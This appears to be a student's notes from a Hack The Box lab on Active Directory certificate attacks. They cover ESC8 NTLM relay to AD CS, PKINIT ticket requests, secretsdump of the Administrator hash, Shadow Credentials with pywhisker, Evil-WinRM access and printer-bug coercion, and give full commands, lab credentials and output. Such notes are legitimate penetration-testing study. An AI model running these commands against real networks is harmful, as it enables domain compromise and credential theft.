PKINIT = Public Key Cryptography for Initial Authentication

- Pass the Certificate often refers to the technique of using X.509 Certs to successfully obtain Ticket Granting Tickets. This Method is primarily used alongside attacks against Active Directory Certificate Services (AD CS) as well as Shadow Credentials. 

## AD CS NTLM Relay Attack

**ESC8**
- This is an NTLM Relay Attack targeting an ADCS HTTP endpoint. 
- By default, cert authority configured to allow web enrollement typically hosts the following application over an HTTP connection /CertSrv

![[Pasted image 20251029210939.png]]


Attackers can use ImPackets ntlmrelayx to listen for inbound connections and relay them to the web enrolloment service using the following command: 
```shell-session
realCustampin@htb[/htb]$ impacket-ntlmrelayx -t http://10.129.234.110/certsrv/certfnsh.asp --adcs -smb2support --template KerberosAuthentication
```

**Note:** The value passed to `--template` may be different in other environments. This is simply the certificate template which is used by Domain Controllers for authentication. This can be enumerated with tools like [certipy](https://github.com/ly4k/Certipy).

Now that we have a certificate, we can now perform a Pass-the-certificate attack to obtain a TGT as DC01$ 

```shell-session
realCustampin@htb[/htb]$ git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
realCustampin@htb[/htb]$ python3 -m venv .venv
realCustampin@htb[/htb]$ source .venv/bin/activate
realCustampin@htb[/htb]$ pip3 install -r requirements.txt
```

**Note:** If you encounter error stating `"Error detecting the version of libcrypto"`, it can be fixed by installing the [oscrypto](https://github.com/wbond/oscrypto) library.

```shell-session
realCustampin@htb[/htb]$ pip3 install -I git+https://github.com/wbond/oscrypto.git

```

**Commencing Attack:**

```shell-session
realCustampin@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache

**Familiar Territory:**

- Now that we have a TGT for DC01, we are back to our Pass the Ticket module. 


```shell-session
realCustampin@htb[/htb]$ export KRB5CCNAME=/tmp/dc.ccache
realCustampin@htb[/htb]$ impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL

```

## Shadow Credentials
- An attack the abuses the msDS-KeyCredentialLink attribute of a victim user. This attribute stores public keys that can be used for authentication through PKINIT. 
- Within Bloodhound, the AddKeyCredentialLink edge indicates that one user has write permissions over another user's msDS-KeyCredentialLink attribute.

Using pywhisker, we can perform this attack from a linux system:
```shell-session
realCustampin@htb[/htb]$ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5shores_topher1' --target jpinkman --action add

[*] Must be used with password: bmRH4LK7UwPrAOfvIx6W
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
```


A TGT can now be obtained using gettgtpkinit.py to acquire a TGT as a victim: 
```shell-session
realCustampin@htb[/htb]$ python3 gettgtpkinit.py -cert-pfx ../eFUVVTPf.pfx -pfx-pass 'bmRH4LK7UwPrAOfvIx6W' -dc-ip 10.129.234.109 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache

2025-04-28 20:50:04,937 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Now that we have a ticket, we can now authenticate to the Domain Controller: 
```shell-session
realCustampin@htb[/htb]$ export KRB5CCNAME=/tmp/jpinkman.ccache
realCustampin@htb[/htb]$ klist

Ticket cache: FILE:/tmp/jpinkman.ccache
Default principal: jpinkman@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/28/2025 20:50:04  04/29/2025 06:50:04  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

We can now use Evil-WinRM to login to the user account because that user is part of the Remote Management Users group. 
```shell-session
realCustampin@htb[/htb]$ evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local

## Other Considerations:

We can either sit back and wait for our victims to attempt authentication against their machine randomly, or they can actively coerce them into doing so. This can be done by using the printer bug: 

```shell-session
realCustampin@htb[/htb]$ python3 printerbug.py INLANEFREIGHT.LOCAL/wwhite:"package5shores_topher1"@10.129.234.109 10.10.16.12
